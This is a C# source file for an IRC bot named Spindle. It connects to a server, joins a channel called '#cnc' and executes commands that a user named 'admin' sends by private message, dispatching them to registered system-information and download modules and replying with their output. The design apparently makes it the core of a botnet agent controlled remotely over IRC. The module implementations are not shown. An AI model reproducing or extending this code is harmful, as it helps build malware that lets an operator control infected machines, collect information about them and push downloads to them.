﻿using System;
using System.Collections.Generic;
using IRCLib;
using IRCLib.Data;
using Spindle.Modules;

namespace Spindle {
    public class Bot {
        private Client _ircClient;
        private readonly Dictionary<string, IBotModule> _modules = new Dictionary<string, IBotModule>(); 

        public Bot(string host, string user) {
            _ircClient = new Client(host, new User(user));

            _ircClient.RawMessageSent += (sender, args) => Console.WriteLine(">> " + args.Message + "\n");
            _ircClient.RawMessageReceived += (sender, args) => Console.WriteLine("<< " + args.Message + "\n");

            _ircClient.SetHandler("001", OnServerReady);
            _ircClient.SetHandler("PRIVMSG", OnMessageReceived);

            RegisterModule(new SysInfoModule());
            RegisterModule(new DownloadModule());

            _ircClient.Connect();
        }

        public void RegisterModule(IBotModule module) {
            _modules[module.Identifier] = module;
        }

        private void OnMessageReceived(Client client, Message message) {
            if(message.Source.User != "admin" && message.Source.User != "@admin") return;

            string from = message.Source.User.TrimStart('@');

            string[] parts = message.Parameters[1].Split(' ');
            string command = parts[0];
            string args = null;
            if(parts.Length > 1) {
                for(int i = 1; i < parts.Length; i++) {
                    if(i > 1) {
                        args += " ";
                    }
                    args += parts[i];
                }
            }
            

            IBotModule module;
            if(_modules.TryGetValue(command, out module)) {
                string result = module.CommandReceived(args);
                if(result != null) {
                    client.SendRaw("PRIVMSG {0} :{1}", from, result);
                }
            } else {
                Console.WriteLine("Unknown command " + command);
            }
        }

        private void OnServerReady(Client client, Message message) {
            client.SendRaw("JOIN #cnc");
        }
    }
}